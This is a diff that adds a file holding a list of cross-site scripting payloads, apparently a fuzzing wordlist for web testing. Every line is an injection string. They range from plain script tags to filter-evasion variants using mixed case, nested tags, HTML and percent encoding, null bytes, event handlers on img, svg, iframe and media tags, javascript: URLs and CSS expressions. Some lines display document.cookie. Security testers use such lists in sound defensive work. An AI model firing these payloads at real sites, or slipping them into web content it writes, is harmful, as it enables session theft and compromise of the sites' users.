@@ -1,0 +1,73 @@
+<script>alert("xss");</script>
+<ScRipT>alert("xss");</ScRipT>
+<script>alert(1);</script>
+<ScRiPt>alert(1)</sCriPt>
+"><script>alert("XSS")</script>
+<script>alert(/XSS')</script>
+<script>alert(/XSS/)</script>
+</script><script>alert(1)</script>
+<IMG SRC=jAVasCrIPt:alert('XSS')>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<img src=xss onerror=alert(1)>
+<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
+<img/src=`%00` onerror=this.onerror=confirm(1)
+<form><isindex formaction="javascript&colon;confirm(1)"
+<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
+<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
+<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
+http://www.google<script .com>alert(document.location)</script
+</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
+&#00;</form><input type&#61;"date" onfocus="alert(1)">
+<script ~~~>alert(0%0)</script ~~~>
+<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
+</plaintext\></|\><plaintext/onmouseover=prompt(1)
+<var onmouseover="prompt(1)">On Mouse Over</var>
+<iframe/src \/\/onload = prompt(1)
+<iframe/onreadystatechange=alert(1)
+<svg/onload=alert(1)
+<input value=<><iframe/src=javascript:confirm(1)
+<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
+<svg><script onlypossibleinopera:-)> alert(1)
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+%253cscript%253ealert(1)%253c/script%253e
+foo<script>alert(1)</script>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<img src="javascript:alert('XSS');">
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<input onfocus=write(XSS) autofocus>
+<input onblur=write(XSS) autofocus><input autofocus>
+<body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<form><button formaction="javascript:alert(XSS)">lol
+<!--<img src="--><img src=x onerror=alert(XSS)//">
+<![><img src="]><img src=x onerror=alert(XSS)//">
+<style><img src="</style><img src=x onerror=alert(XSS)//">
+<? foo="><script>alert(1)</script>">
+<! foo="><script>alert(1)</script>">
+</ foo="><script>alert(1)</script>">
+<? foo="><x foo='?><script>alert(1)</script>'>">
+<! foo="[[[Inception]]"><x foo="]foo><script>alert(1)</script>">
+<% foo><x foo="%><script>alert(123)</script>">
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<TABLE><TD BACKGROUND="javascript:alert('XSS')">
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<script>alert(1)</script>
+"><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
+<video src=1 onerror=alert(1)>
+<audio src=1 onerror=alert(1)>
+</script><script >alert(document.cookie)</script>
+<img src=asdf onerror=alert(document.cookie)>
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<XSS STYLE="xss:expression(alert('XSS'))">
+<frameset onload=alert(123)>
+<!--<img src="--><img src=x onerror=alert(123)//">
+<svg xmlns="#"><script>alert(1)</script></svg>
+<svg onload="javascript:alert(123)" xmlns="#"></svg>
+<iframe xmlns="#" src="javascript:alert(1)"></iframe>
+<style><img src="</style><img src=x onerror=alert(123)//">
+<embed src="javascript:alert(1)">
+<script src="#">{alert(1)}</script>;1
